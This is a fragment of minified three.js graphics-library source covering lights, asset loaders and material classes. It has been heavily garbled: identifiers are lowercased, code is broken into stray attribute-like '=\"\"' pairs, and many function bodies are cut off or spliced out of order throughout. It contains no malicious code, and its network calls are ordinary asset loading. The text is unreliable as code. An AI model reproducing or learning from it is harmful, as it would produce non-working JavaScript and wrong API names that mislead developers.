4*this.intensity*math.pi},set:function(a){this.intensity=\"a/(4*Math.PI)}});this.distance=void\" three.lightshadow(new=\"\" three.perspectivecamera(90,1,.5,500))};=\"\" three.pointlight.prototype=\"Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.PointLight,copy:function(a){THREE.Light.prototype.copy.call(this,a);this.distance=a.distance;this.decay=a.decay;this.shadow=a.shadow.clone();return\" three.spotlight=\"function(a,b,c,d,e,f){THREE.Light.call(this,a,b);this.type=\" spotlight\";this.position.set(0,1,0);this.updatematrix();this.target=\"new\"\" three.object3d;object.defineproperty(this,\"power\",{get:function(){return=\"\" this.intensity*math.pi},set:function(a){this.intensity=\"a/Math.PI}});this.distance=void\" three.spotlightshadow};=\"\" three.spotlight.prototype=\"Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.SpotLight,copy:function(a){THREE.Light.prototype.copy.call(this,a);this.distance=a.distance;this.angle=a.angle;this.penumbra=a.penumbra;this.decay=a.decay;this.target=a.target.clone();this.shadow=a.shadow.clone();return\" this}});three.spotlightshadow=\"function(){THREE.LightShadow.call(this,new\" three.perspectivecamera(50,1,.5,500))};=\"\" three.spotlightshadow.prototype=\"Object.assign(Object.create(THREE.LightShadow.prototype),{constructor:THREE.SpotLightShadow,update:function(a){var\" b=\"2*THREE.Math.RAD2DEG*a.angle,c=this.mapSize.width/this.mapSize.height;a=a.distance||500;var\" object.assign(three.audioloader.prototype,{load:function(a,b,c,d){var=\"\" three.xhrloader(this.manager);e.setresponsetype(\"arraybuffer\");e.load(a,function(a){three.audiocontext.decodeaudiodata(a,function(a){b(a)})},c,d)}});three.cache=\"{enabled:!1,files:{},add:function(a,b){!1!==this.enabled&&(this.files[a]=b)},get:function(a){if(!1!==this.enabled)return\" this.files[a]},remove:function(a){delete=\"\" this.files[a]},clear:function(){this.files=\"{}}};\" three.loader=\"function(){this.onLoadStart=function(){};this.onLoadProgress=function(){};this.onLoadComplete=function(){}};\" three.loader.prototype=\"{constructor:THREE.Loader,crossOrigin:void\" 0,extracturlbase:function(a){a=\"a.split(\" \");if(1=\"==a.length)return\"./\";a.pop();return\"\" a.join(\"=\"\" \")+\"=\"\" \"},initmaterials:function(a,b,c){for(var=\"\" d},creatematerial:function(){var=\"\" a,b,c;return=\"\" function(d,e,f){function=\"\" g(a,c,d,g,k){a=\"e+a;var\" l=\"THREE.Loader.Handlers.get(a);null!==l?a=l.load(a):(b.setCrossOrigin(f),a=b.load(a));void\" three.repeatwrapping),1!=\"=c[1]&&(a.wrapT=THREE.RepeatWrapping));void\" c}void=\"\" three.color);void=\"\" three.textureloader);void=\"\" three.materialloader);=\"\" var=\"\" in=\"\" d){var=\"\" n=\"d[l];switch(l){case\" \"dbgcolor\":case=\"\" \"dbgindex\":case=\"\" \"opticaldensity\":case=\"\" \"illumination\":break;case=\"\" \"dbgname\":k.name=\"n;break;case\" \"blending\":k.blending=\"THREE[n];break;case\" \"colorambient\":case=\"\" \"mapambient\":console.warn(\"three.loader.creatematerial:\",l,\"is=\"\" longer=\"\" supported.\");break;case=\"\" \"colordiffuse\":k.color=\"a.fromArray(n).getHex();break;case\" \"colorspecular\":k.specular=\"a.fromArray(n).getHex();break;case\" \"coloremissive\":k.emissive=\"a.fromArray(n).getHex();break;case\" \"specularcoef\":k.shininess=\"n;break;case\" \"shading\":\"basic\"=\"==n.toLowerCase()&&(k.type=\" meshbasicmaterial\");\"phong\"=\"==n.toLowerCase()&&(k.type=\"MeshPhongMaterial\");\"standard\"===n.toLowerCase()&&(k.type=\"MeshStandardMaterial\");break;case\"\" \"mapdiffuse\":k.map=\"g(n,d.mapDiffuseRepeat,d.mapDiffuseOffset,d.mapDiffuseWrap,d.mapDiffuseAnisotropy);break;case\" \"mapdiffuserepeat\":case=\"\" \"mapdiffuseoffset\":case=\"\" \"mapdiffusewrap\":case=\"\" \"mapdiffuseanisotropy\":break;case=\"\" \"mapemissive\":k.emissivemap=\"g(n,d.mapEmissiveRepeat,d.mapEmissiveOffset,d.mapEmissiveWrap,d.mapEmissiveAnisotropy);break;case\" \"mapemissiverepeat\":case=\"\" \"mapemissiveoffset\":case=\"\" \"mapemissivewrap\":case=\"\" \"mapemissiveanisotropy\":break;case=\"\" \"maplight\":k.lightmap=\"g(n,d.mapLightRepeat,d.mapLightOffset,d.mapLightWrap,d.mapLightAnisotropy);break;case\" \"maplightrepeat\":case=\"\" \"maplightoffset\":case=\"\" \"maplightwrap\":case=\"\" \"maplightanisotropy\":break;case=\"\" \"mapao\":k.aomap=\"g(n,d.mapAORepeat,d.mapAOOffset,d.mapAOWrap,d.mapAOAnisotropy);break;case\" \"mapaorepeat\":case=\"\" \"mapaooffset\":case=\"\" \"mapaowrap\":case=\"\" \"mapaoanisotropy\":break;=\"\" case=\"\" \"mapbump\":k.bumpmap=\"g(n,d.mapBumpRepeat,d.mapBumpOffset,d.mapBumpWrap,d.mapBumpAnisotropy);break;case\" \"mapbumpscale\":k.bumpscale=\"n;break;case\" \"mapbumprepeat\":case=\"\" \"mapbumpoffset\":case=\"\" \"mapbumpwrap\":case=\"\" \"mapbumpanisotropy\":break;case=\"\" \"mapnormal\":k.normalmap=\"g(n,d.mapNormalRepeat,d.mapNormalOffset,d.mapNormalWrap,d.mapNormalAnisotropy);break;case\" \"mapnormalfactor\":k.normalscale=\"[n,n];break;case\" \"mapnormalrepeat\":case=\"\" \"mapnormaloffset\":case=\"\" \"mapnormalwrap\":case=\"\" \"mapnormalanisotropy\":break;case=\"\" \"mapspecular\":k.specularmap=\"g(n,d.mapSpecularRepeat,d.mapSpecularOffset,d.mapSpecularWrap,d.mapSpecularAnisotropy);break;case\" \"mapspecularrepeat\":case=\"\" \"mapspecularoffset\":case=\"\" \"mapspecularwrap\":case=\"\" \"mapspecularanisotropy\":break;case=\"\" \"mapmetalness\":k.metalnessmap=\"g(n,d.mapMetalnessRepeat,d.mapMetalnessOffset,d.mapMetalnessWrap,d.mapMetalnessAnisotropy);break;case\" \"mapmetalnessrepeat\":case=\"\" \"mapmetalnessoffset\":case=\"\" \"mapmetalnesswrap\":case=\"\" \"mapmetalnessanisotropy\":break;case=\"\" \"maproughness\":k.roughnessmap=\"g(n,d.mapRoughnessRepeat,\" d.maproughnessoffset,d.maproughnesswrap,d.maproughnessanisotropy);break;case=\"\" \"maproughnessrepeat\":case=\"\" \"maproughnessoffset\":case=\"\" \"maproughnesswrap\":case=\"\" \"maproughnessanisotropy\":break;case=\"\" \"mapalpha\":k.alphamap=\"g(n,d.mapAlphaRepeat,d.mapAlphaOffset,d.mapAlphaWrap,d.mapAlphaAnisotropy);break;case\" \"mapalpharepeat\":case=\"\" \"mapalphaoffset\":case=\"\" \"mapalphawrap\":case=\"\" \"mapalphaanisotropy\":break;case=\"\" \"flipsided\":k.side=\"THREE.BackSide;break;case\" \"doublesided\":k.side=\"THREE.DoubleSide;break;case\" \"transparency\":console.warn(\"three.loader.creatematerial:=\"\" transparency=\"\" been=\"\" renamed=\"\" to=\"\" opacity\");=\"\" k.opacity=\"n;break;case\" \"depthtest\":case=\"\" \"depthwrite\":case=\"\" \"colorwrite\":case=\"\" \"opacity\":case=\"\" \"reflectivity\":case=\"\" \"transparent\":case=\"\" \"visible\":case=\"\" \"wireframe\":k[l]=\"n;break;case\" \"vertexcolors\":!0=\"==n&&(k.vertexColors=THREE.VertexColors);\" face\"=\"==n&&(k.vertexColors=THREE.FaceColors);break;default:console.error(\"THREE.Loader.createMaterial:\"\" unsupported\",l,n)}}\"meshbasicmaterial\"=\"==k.type&&delete\" k.emissive;\"meshphongmaterial\"!=\"=k.type&&delete\" k.specular;1=\"\">k.opacity&&(k.transparent=!0);c.setTextures(h);\nreturn c.parse(k)}}()};THREE.Loader.Handlers={handlers:[],add:function(a,b){this.handlers.push(a,b)},get:function(a){for(var b=this.handlers,c=0,d=b.length;c<d;c+=2){var 0=\"\" e=\"b[c+1];if(b[c].test(a))return\" e}return=\"\" null}};three.xhrloader=\"function(a){this.manager=void\" 0!=\"=a?a:THREE.DefaultLoadingManager};\" object.assign(three.xhrloader.prototype,{load:function(a,b,c,d){void=\"\" b&&settimeout(function(){b(f)},0),f;var=\"\" g=\"new\" xmlhttprequest;g.overridemimetype(\"text=\"\" plain\");g.open(\"get\",a,!0);g.addeventlistener(\"load\",function(c){var=\"\" f=\"c.target.response;THREE.Cache.add(a,f);200===this.status?(b&&b(f),e.manager.itemEnd(a)):0===this.status?(console.warn(\" three.xhrloader:\"=\"\" http=\"\" status=\"\" received.\"),b&&b(f),e.manager.itemend(a)):=\"\" (d&&d(c),e.manager.itemerror(a))},!1);void=\"\" g},setpath:function(a){this.path=\"a;return\" this},setresponsetype:function(a){this.responsetype=\"a;return\" this},setwithcredentials:function(a){this.withcredentials=\"a;return\" this}});three.fontloader=\"function(a){this.manager=void\" three.xhrloader(this.manager)).load(a,function(a){var=\"\" c;try{c=\"JSON.parse(a)}catch(d){console.warn(\" three.fontloader:\"=\"\" typeface.js=\"\" support=\"\" is=\"\" being=\"\" deprecated.=\"\" use=\"\" typeface.json=\"\" instead.\"),c=\"JSON.parse(a.substring(65,a.length-2))}a=e.parse(c);b&&b(a)},c,d)},parse:function(a){return\" new=\"\" three.font(a)}});=\"\" three.imageloader=\"function(a){this.manager=void\" object.assign(three.imageloader.prototype,{load:function(a,b,c,d){var=\"\" three.xhrloader(this.manager);f.setpath(this.path);f.setresponsetype(\"blob\");f.load(a,function(a){e.src=\"URL.createObjectURL(a)},c,d)}return\" e},setcrossorigin:function(a){this.crossorigin=\"a;return\" this},setpath:function(a){this.path=\"a;return\" this}});=\"\" three.jsonloader=\"function(a){\" boolean\"=\"==typeof\"\" a&&(console.warn(\"three.jsonloader:=\"\" showstatus=\"\" parameter=\"\" has=\"\" been=\"\" removed=\"\" from=\"\" constructor.\"),a=\"void\" 0);this.manager=\"void\" object.assign(three.jsonloader.prototype,{load:function(a,b,c,d){var=\"\" this.texturepath?this.texturepath:three.loader.prototype.extracturlbase(a),g=\"new\" three.xhrloader(this.manager);g.setwithcredentials(this.withcredentials);g.load(a,function(c){c=\"JSON.parse(c);var\" d=\"c.metadata;if(void\" \"+a+\"=\"\" should=\"\" be=\"\" loaded=\"\" with=\"\" three.objectloader=\"\" instead.\");return}if(\"scene\"=\"==\" d.tolowercase()){console.error(\"three.jsonloader:=\"\" three.sceneloader=\"\" instead.\");return}}c=\"e.parse(c,f);b(c.geometry,c.materials)},c,d)},setTexturePath:function(a){this.texturePath=a},parse:function(a,b){var\" c=\"new\" three.geometry,d=\"void\" d,g,h,k,l,n,p,m,q,r,s,t,u,v=\"a.faces;n=a.vertices;var\" l;)d=\"new\" three.vector3,d.x=\"n[k++]*b,d.y=n[k++]*b,d.z=n[k++]*b,c.vertices.push(d);k=0;for(l=v.length;k<l;)if(b=v[k++],q=b&1,h=b&2,d=b&8,p=b&16,r=b&32,n=b&64,b&=128,q){q=new\" three.face3;q.a=\"v[k];q.b=v[k+1];q.c=v[k+3];s=new\" three.face3;s.a=\"v[k+1];s.b=v[k+2];s.c=v[k+3];k+=4;h&&(h=v[k++],q.materialIndex=h,s.materialIndex=h);h=c.faces.length;if(d)for(d=0;d<E;d++)for(t=a.uvs[d],c.faceVertexUvs[d][h]=[],c.faceVertexUvs[d][h+1]=[],g=0;4\">g;g++)m=v[k++],u=t[2*m],m=t[2*m+1],u=new THREE.Vector2(u,m),2!==g&&c.faceVertexUvs[d][h].push(u),\n0!==g&&c.faceVertexUvs[d][h+1].push(u);p&&(p=3*v[k++],q.normal.set(C[p++],C[p++],C[p]),s.normal.copy(q.normal));if(r)for(d=0;4>d;d++)p=3*v[k++],r=new THREE.Vector3(C[p++],C[p++],C[p]),2!==d&&q.vertexNormals.push(r),0!==d&&s.vertexNormals.push(r);n&&(n=v[k++],n=w[n],q.color.setHex(n),s.color.setHex(n));if(b)for(d=0;4>d;d++)n=v[k++],n=w[n],2!==d&&q.vertexColors.push(new THREE.Color(n)),0!==d&&s.vertexColors.push(new THREE.Color(n));c.faces.push(q);c.faces.push(s)}else{q=new THREE.Face3;q.a=v[k++];q.b=\nv[k++];q.c=v[k++];h&&(h=v[k++],q.materialIndex=h);h=c.faces.length;if(d)for(d=0;d<e;d++)for(t=a.uvs[d],c.facevertexuvs[d][h]=[],g=0;3>g;g++)m=v[k++],u=t[2*m],m=t[2*m+1],u=new THREE.Vector2(u,m),c.faceVertexUvs[d][h].push(u);p&&(p=3*v[k++],q.normal.set(C[p++],C[p++],C[p]));if(r)for(d=0;3>d;d++)p=3*v[k++],r=new THREE.Vector3(C[p++],C[p++],C[p]),q.vertexNormals.push(r);n&&(n=v[k++],q.color.setHex(w[n]));if(b)for(d=0;3>d;d++)n=v[k++],q.vertexColors.push(new THREE.Color(w[n]));c.faces.push(q)}})(d);(function(){var b=\nvoid 0!==a.influencesPerVertex?a.influencesPerVertex:2;if(a.skinWeights)for(var d=0,g=a.skinWeights.length;d<g;d+=b)c.skinweights.push(new 0=\"==a.materials||0===a.materials.length)return{geometry:c};d=THREE.Loader.prototype.initMaterials(a.materials,b,this.crossOrigin);return{geometry:c,materials:d}}});\" three.vector4(a.skinweights[d],1<b?a.skinweights[d+1]:0,2<b?a.skinweights[d+2]:0,3<b?a.skinweights[d+3]:0));if(a.skinindices)for(d=\"0,g=a.skinIndices.length;d<g;d+=b)c.skinIndices.push(new\" three.vector4(a.skinindices[d],1<b?a.skinindices[d+1]:0,2<b?a.skinindices[d+2]:0,3<b?a.skinindices[d+3]:0));c.bones=\"a.bones;c.bones&&0<c.bones.length&&(c.skinWeights.length!==\" c.skinindices.length||c.skinindices.length!=\"=c.vertices.length)&&console.warn(\" when\"=\"\" skinning,=\"\" number=\"\" of=\"\" vertices=\"\" (\"+c.vertices.length+\"),=\"\" skinindices=\"\" (\"+c.skinindices.length+\"),=\"\" and=\"\" skinweights=\"\" (\"+c.skinweights.length+\")=\"\" should=\"\" match.\")})();(function(b){if(void=\"\" 0!=\"=a.morphTargets)for(var\" d=\"0,g=a.morphTargets.length;d<g;d++){c.morphTargets[d]={};c.morphTargets[d].name=a.morphTargets[d].name;c.morphTargets[d].vertices=[];for(var\" h=\"c.morphTargets[d].vertices,k=a.morphTargets[d].vertices,l=0,n=k.length;l<\" n;l+=\"3){var\" p=\"new\" three.vector3;p.x=\"k[l]*b;p.y=k[l+1]*b;p.z=k[l+2]*b;h.push(p)}}if(void\" \"morphcolors\"=\"\" no=\"\" longer=\"\" supported.=\"\" using=\"\" them=\"\" as=\"\" face=\"\" colors.'),b=\"c.faces,h=a.morphColors[0].colors,d=0,g=b.length;d<g;d++)b[d].color.fromArray(h,3*d)})(d);(function(){var\" b=\"[],d=[];void\" g=\"0;g<d.length;g++){var\" three.loadingmanager=\"function(a,b,c){var\" 0;this.onload=\"a;this.onProgress=b;this.onError=c;this.itemStart=function(a){g++;if(!1===e&&void\" three.loadingmanager;=\"\" three.buffergeometryloader=\"function(a){this.manager=void\" object.assign(three.buffergeometryloader.prototype,{load:function(a,b,c,d){var=\"\" e=\"this;(new\" three.xhrloader(e.manager)).load(a,function(a){b(e.parse(json.parse(a)))},c,d)},parse:function(a){var=\"\" three.buffergeometry,c=\"a.data.index,d={Int8Array:Int8Array,Uint8Array:Uint8Array,Uint8ClampedArray:Uint8ClampedArray,Int16Array:Int16Array,Uint16Array:Uint16Array,Int32Array:Int32Array,Uint32Array:Uint32Array,Float32Array:Float32Array,Float64Array:Float64Array};void\" d[c.type](c.array),b.setindex(new=\"\" three.bufferattribute(c,=\"\" 1)));var=\"\" in=\"\" e){var=\"\" d[g.type](g.array);b.addattribute(f,new=\"\" three.bufferattribute(c,g.itemsize,g.normalized))}d=\"a.data.groups||a.data.drawcalls||a.data.offsets;if(void\" three.vector3,void=\"\" three.sphere(d,a.radius));return=\"\" b}});=\"\" three.materialloader=\"function(a){this.manager=void\" object.assign(three.materialloader.prototype,{load:function(a,b,c,d){var=\"\" three.xhrloader(e.manager)).load(a,function(a){b(e.parse(json.parse(a)))},c,d)},settextures:function(a){this.textures=\"a},getTexture:function(a){var\" undefined=\"\" texture\",a);return=\"\" b[a]},parse:function(a){var=\"\" three[a.type];void=\"\" (b.roughness=\"a.roughness);void\" (b.blending=\"a.blending);void\" void=\"\" c=\"a.normalScale;!1===Array.isArray(c)&&(c=[c,c]);b.normalScale=(new\" three.vector2).fromarray(c)}void=\"\" (b.displacementmap=\"this.getTexture(a.displacementMap));void\" (b.specularmap=\"this.getTexture(a.specularMap));void\" d;c++)b.materials.push(this.parse(a.materials[c]));return=\"\" b}});three.objectloader=\"function(a){this.manager=void\" object.assign(three.objectloader.prototype,{load:function(a,b,c,d){\"\"=\"==this.texturePath&&(this.texturePath=a.substring(0,a.lastIndexOf(\" \")+1));var\"=\"\" three.xhrloader(e.manager)).load(a,function(a){e.parse(json.parse(a),b)},c,d)},settexturepath:function(a){this.texturepath=\"a},setCrossOrigin:function(a){this.crossOrigin=a},parse:function(a,b){var\" d),e=\"this.parseObject(a.object,c,d);a.animations&&(e.animations=this.parseAnimations(a.animations));void\" e},parsegeometries:function(a){var=\"\" three.jsonloader,d=\"new\" three.buffergeometryloader,e=\"0,f=a.length;e<f;e++){var\" g,h=\"a[e];switch(h.type){case\" \"planegeometry\":case=\"\" \"planebuffergeometry\":g=\"new\" three[h.type](h.width,h.height,h.widthsegments,h.heightsegments);break;case=\"\" \"boxgeometry\":case=\"\" \"boxbuffergeometry\":case=\"\" \"cubegeometry\":g=\"new\" three[h.type](h.width,h.height,h.depth,h.widthsegments,h.heightsegments,h.depthsegments);break;case=\"\" \"circlegeometry\":case=\"\" \"circlebuffergeometry\":g=\"new\" three[h.type](h.radius,h.segments,h.thetastart,h.thetalength);break;case=\"\" \"cylindergeometry\":case=\"\" \"cylinderbuffergeometry\":g=\"new\" three[h.type](h.radiustop,h.radiusbottom,h.height,h.radialsegments,h.heightsegments,h.openended,h.thetastart,h.thetalength);break;case=\"\" \"conegeometry\":case=\"\" \"conebuffergeometry\":g=\"new\" three[h.type](h.radius,h.height,h.radialsegments,=\"\" h.heightsegments,h.openended,h.thetastart,h.thetalength);break;case=\"\" \"spheregeometry\":case=\"\" \"spherebuffergeometry\":g=\"new\" three[h.type](h.radius,h.widthsegments,h.heightsegments,h.phistart,h.philength,h.thetastart,h.thetalength);break;case=\"\" \"dodecahedrongeometry\":case=\"\" \"icosahedrongeometry\":case=\"\" \"octahedrongeometry\":case=\"\" \"tetrahedrongeometry\":g=\"new\" three[h.type](h.radius,h.detail);break;case=\"\" \"ringgeometry\":case=\"\" \"ringbuffergeometry\":g=\"new\" three[h.type](h.innerradius,h.outerradius,h.thetasegments,h.phisegments,=\"\" h.thetastart,h.thetalength);break;case=\"\" \"torusgeometry\":case=\"\" \"torusbuffergeometry\":g=\"new\" three[h.type](h.radius,h.tube,h.radialsegments,h.tubularsegments,h.arc);break;case=\"\" \"torusknotgeometry\":case=\"\" \"torusknotbuffergeometry\":g=\"new\" three[h.type](h.radius,h.tube,h.tubularsegments,h.radialsegments,h.p,h.q);break;case=\"\" \"lathegeometry\":case=\"\" \"lathebuffergeometry\":g=\"new\" three[h.type](h.points,h.segments,h.phistart,h.philength);break;case=\"\" \"buffergeometry\":g=\"d.parse(h);break;case\" \"geometry\":g=\"c.parse(h.data,this.texturePath).geometry;\" break;default:console.warn('three.objectloader:=\"\" unsupported=\"\" geometry=\"\" type=\"\" \"'+h.type+'\"');continue}g.uuid=\"h.uuid;void\" b},parsematerials:function(a,b){var=\"\" three.materialloader;d.settextures(b);for(var=\"\" c},parseanimations:function(a){for(var=\"\" b},parseimages:function(a,b){function=\"\" c(a){d.manager.itemstart(a);=\"\" return=\"\" g.load(a,function(){d.manager.itemend(a)})}var=\"\" f=\"new\" three.loadingmanager(b),g=\"new\" three.imageloader(f);g.setcrossorigin(this.crossorigin);for(var=\"\" k=\"a[f],l=/^(\\/\\/)|([a-z]+:(\\/\\/)?)/i.test(k.url)?k.url:d.texturePath+k.url;e[k.uuid]=c(l)}}return\" e},parsetextures:function(a,b){function=\"\" c(a){if(\"number\"=\"==typeof\" a)return=\"\" a;console.warn(\"three.objectloader.parsetexture:=\"\" constant=\"\" be=\"\" numeric=\"\" form.\",a);return=\"\" three[a]}=\"\" var=\"\" \"image\"=\"\" specified=\"\" for',g.uuid);void=\"\" image\",g.image);var=\"\" three.texture(b[g.image]);h.needsupdate=\"!0;h.uuid=g.uuid;void\" three.vector2(g.offset[0],g.offset[1]));void=\"\" three.vector2(g.repeat[0],=\"\" g.repeat[1]));void=\"\" d},parseobject:function(){var=\"\" a=\"new\" three.matrix4;return=\"\" function(b,c,d){function=\"\" e(a){void=\"\" geometry\",a);return=\"\" c[a]}function=\"\" f(a){if(void=\"\" material\",=\"\" a),d[a]}var=\"\" g;switch(b.type){case=\"\" \"scene\":g=\"new\" three.scene;break;case=\"\" \"perspectivecamera\":g=\"new\" three.perspectivecamera(b.fov,b.aspect,b.near,b.far);void=\"\" \"orthographiccamera\":g=\"new\" three.orthographiccamera(b.left,b.right,b.top,b.bottom,b.near,b.far);break;case=\"\" \"ambientlight\":g=\"new\" three.ambientlight(b.color,b.intensity);break;case=\"\" \"directionallight\":g=\"new\" three.directionallight(b.color,b.intensity);break;case=\"\" \"pointlight\":g=\"new\" three.pointlight(b.color,b.intensity,b.distance,b.decay);break;case=\"\" \"spotlight\":g=\"new\" three.spotlight(b.color,b.intensity,b.distance,b.angle,b.penumbra,b.decay);break;case=\"\" \"hemispherelight\":g=\"new\" three.hemispherelight(b.color,b.groundcolor,b.intensity);break;case=\"\" \"mesh\":g=\"e(b.geometry);var\" three.skinnedmesh(g,=\"\" h):new=\"\" three.mesh(g,h);break;case=\"\" \"lod\":g=\"new\" three.lod;break;case=\"\" \"line\":g=\"new\" three.line(e(b.geometry),f(b.material),b.mode);break;case=\"\" \"pointcloud\":case=\"\" \"points\":g=\"new\" three.points(e(b.geometry),f(b.material));break;case=\"\" \"sprite\":g=\"new\" three.sprite(f(b.material));break;case=\"\" \"group\":g=\"new\" three.group;break;default:g=\"new\" three.object3d}g.uuid=\"b.uuid;void\" b.children)g.add(this.parseobject(b.children[k],c,d));if(\"lod\"=\"==b.type)for(b=b.levels,h=0;h<b.length;h++){var\" l=\"b[h];k=g.getObjectByProperty(\" uuid\",l.object);void\"=\"\" k&&g.addlevel(k,l.distance)}return=\"\" g}}()});three.textureloader=\"function(a){this.manager=void\" three.texture,f=\"new\" three.imageloader(this.manager);f.setcrossorigin(this.crossorigin);f.setpath(this.path);f.load(a,function(a){e.image=\"a;e.needsUpdate=!0;void\" e},setcrossorigin:function(a){this.crossorigin=\"a;return\" this},setpath:function(a){this.path=\"a;return\" this}});=\"\" three.cubetextureloader=\"function(a){this.manager=void\" object.assign(three.cubetextureloader.prototype,{load:function(a,b,c,d){function=\"\" e(c){g.load(a[c],function(a){f.images[c]=\"a;h++;6===h&&(f.needsUpdate=!0,b&&b(f))},void\" 0,d)}var=\"\" three.cubetexture,g=\"new\" three.imageloader(this.manager);g.setcrossorigin(this.crossorigin);g.setpath(this.path);var=\"\" f},setcrossorigin:function(a){this.crossorigin=\"a;return\" three.datatextureloader=\"THREE.BinaryTextureLoader=function(a){this.manager=void\" object.assign(three.binarytextureloader.prototype,{load:function(a,b,c,d){var=\"\" three.datatexture,g=\"new\" three.xhrloader(this.manager);g.setresponsetype(\"arraybuffer\");g.load(a,function(a){if(a=\"e._parser(a))void\" f.minfilter=\"void\" f}});three.compressedtextureloader=\"function(a){this.manager=void\" object.assign(three.compressedtextureloader.prototype,{load:function(a,b,c,d){function=\"\" e(e){k.load(a[e],function(a){a=\"f._parser(a,!0);g[e]={width:a.width,height:a.height,format:a.format,mipmaps:a.mipmaps};l+=1;6===l&&(1===a.mipmapCount&&(h.minFilter=THREE.LinearFilter),h.format=a.format,h.needsUpdate=!0,b&&b(h))},c,d)}var\" three.compressedtexture;h.image=\"g;var\" three.xhrloader(this.manager);k.setpath(this.path);k.setresponsetype(\"arraybuffer\");if(array.isarray(a))for(var=\"\" n=\"0,p=a.length;n<p;++n)e(n);else\" k.load(a,function(a){a=\"f._parser(a,!0);if(a.isCubemap)for(var\" h.image.width=\"a.width,h.image.height=a.height,h.mipmaps=a.mipmaps;1===a.mipmapCount&&(h.minFilter=THREE.LinearFilter);h.format=a.format;h.needsUpdate=!0;b&&b(h)},c,d);return\" h},setpath:function(a){this.path=\"a;return\" three.material=\"function(){Object.defineProperty(this,\" id\",{value:three.materialidcount++});this.uuid=\"THREE.Math.generateUUID();this.name=\"\";this.type=\"Material\";this.lights=this.fog=!0;this.blending=THREE.NormalBlending;this.side=THREE.FrontSide;this.shading=THREE.SmoothShading;this.vertexColors=THREE.NoColors;this.opacity=1;this.transparent=!1;this.blendSrc=THREE.SrcAlphaFactor;this.blendDst=THREE.OneMinusSrcAlphaFactor;this.blendEquation=THREE.AddEquation;this.blendEquationAlpha=this.blendDstAlpha=\"\" this.blendsrcalpha=\"null;this.depthFunc=THREE.LessEqualDepth;this.depthWrite=this.depthTest=!0;this.clippingPlanes=null;this.clipShadows=!1;this.colorWrite=!0;this.precision=null;this.polygonOffset=!1;this.alphaTest=this.polygonOffsetUnits=this.polygonOffsetFactor=0;this.premultipliedAlpha=!1;this.overdraw=0;this._needsUpdate=this.visible=!0};\" three.material.prototype=\"{constructor:THREE.Material,get\" needsupdate(){return=\"\" this._needsupdate},set=\"\" needsupdate(a){!0=\"==a&&this.update();this._needsUpdate=a},setValues:function(a){if(void\" a){var=\"\" '\"+b+\"'=\"\" parameter=\"\" is=\"\" undefined.\");else{var=\"\" not=\"\" property=\"\" this=\"\" material.\"):d=\"\" instanceof=\"\" three.color?d.set(c):d=\"\" three.vector3&&c=\"\" three.vector3?d.copy(c):=\"\" this[b]=\"overdraw\" ==\"=b?Number(c):c}}},toJSON:function(a){function\" b(a){var=\"\" d.metadata;b.push(d)}return=\"\" b}var=\"\" three.color&&(d.color=\"this.color.getHex());void\" this.emissive=\"\" three.color&&(d.emissive=\"this.emissive.getHex());this.specular\" three.color&&(d.specular=\"this.specular.getHex());void\" three.texture&&(d.map=\"this.map.toJSON(a).uuid);this.alphaMap\" three.texture&&(d.alphamap=\"this.alphaMap.toJSON(a).uuid);this.lightMap\" three.texture&&(d.lightmap=\"this.lightMap.toJSON(a).uuid);this.bumpMap\" three.texture&&(d.bumpmap=\"this.bumpMap.toJSON(a).uuid,\" d.bumpscale=\"this.bumpScale);this.normalMap\" three.texture&&(d.normalmap=\"this.normalMap.toJSON(a).uuid,d.normalScale=this.normalScale.toArray());this.displacementMap\" three.texture&&(d.displacementmap=\"this.displacementMap.toJSON(a).uuid,d.displacementScale=this.displacementScale,d.displacementBias=this.displacementBias);this.roughnessMap\" three.texture&&(d.roughnessmap=\"this.roughnessMap.toJSON(a).uuid);this.metalnessMap\" three.texture&&(d.metalnessmap=\"this.metalnessMap.toJSON(a).uuid);\" this.emissivemap=\"\" three.texture&&(d.emissivemap=\"this.emissiveMap.toJSON(a).uuid);this.specularMap\" three.texture&&(d.specularmap=\"this.specularMap.toJSON(a).uuid);this.envMap\" three.texture&&(d.envmap=\"this.envMap.toJSON(a).uuid,d.reflectivity=this.reflectivity);void\" (d.shading=\"this.shading);this.side!==THREE.FrontSide&&(d.side=this.side);this.vertexColors!==THREE.NoColors&&(d.vertexColors=this.vertexColors);1\">this.opacity&&(d.opacity=this.opacity);!0===this.transparent&&(d.transparent=this.transparent);0<this.alphatest&&(d.alphatest=this.alphatest);!0===this.premultipliedalpha&&(d.premultipliedalpha=this.premultipliedalpha);!0===this.wireframe&&(d.wireframe=this.wireframe);1<this.wireframelinewidth&&(d.wireframelinewidth=this.wireframelinewidth);c&&(c=b(a.textures), 0=\"==c.uuid&&(c.uuid=THREE.Math.generateUUID());if(void\" a=\"b(a.images),0<c.length&&(d.textures=c),0<a.length&&(d.images=a));return\" d},clone:function(){return(new=\"\" this.constructor).copy(this)},copy:function(a){this.name=\"a.name;this.fog=a.fog;this.lights=a.lights;this.blending=a.blending;this.side=a.side;this.shading=a.shading;this.vertexColors=a.vertexColors;this.opacity=a.opacity;this.transparent=a.transparent;this.blendSrc=a.blendSrc;this.blendDst=a.blendDst;this.blendEquation=a.blendEquation;this.blendSrcAlpha=a.blendSrcAlpha;this.blendDstAlpha=a.blendDstAlpha;\" this.blendequationalpha=\"a.blendEquationAlpha;this.depthFunc=a.depthFunc;this.depthTest=a.depthTest;this.depthWrite=a.depthWrite;this.colorWrite=a.colorWrite;this.precision=a.precision;this.polygonOffset=a.polygonOffset;this.polygonOffsetFactor=a.polygonOffsetFactor;this.polygonOffsetUnits=a.polygonOffsetUnits;this.alphaTest=a.alphaTest;this.premultipliedAlpha=a.premultipliedAlpha;this.overdraw=a.overdraw;this.visible=a.visible;this.clipShadows=a.clipShadows;a=a.clippingPlanes;var\" b=\"null;if(null!==\" a)for(var=\"\" c=\"a.length,b=Array(c),d=0;d!==c;++d)b[d]=a[d].clone();this.clippingPlanes=b;return\" this},update:function(){this.dispatchevent({type:\"update\"})},dispose:function(){this.dispatchevent({type:\"dispose\"})}};object.assign(three.material.prototype,three.eventdispatcher.prototype);three.materialidcount=\"0;\" three.linebasicmaterial=\"function(a){THREE.Material.call(this);this.type=\" linebasicmaterial\";this.color=\"new\"\" three.color(16777215);this.linewidth=\"1;this.linejoin=this.linecap=\" round\";this.lights=\"!1;this.setValues(a)};THREE.LineBasicMaterial.prototype=Object.create(THREE.Material.prototype);THREE.LineBasicMaterial.prototype.constructor=THREE.LineBasicMaterial;\"\" 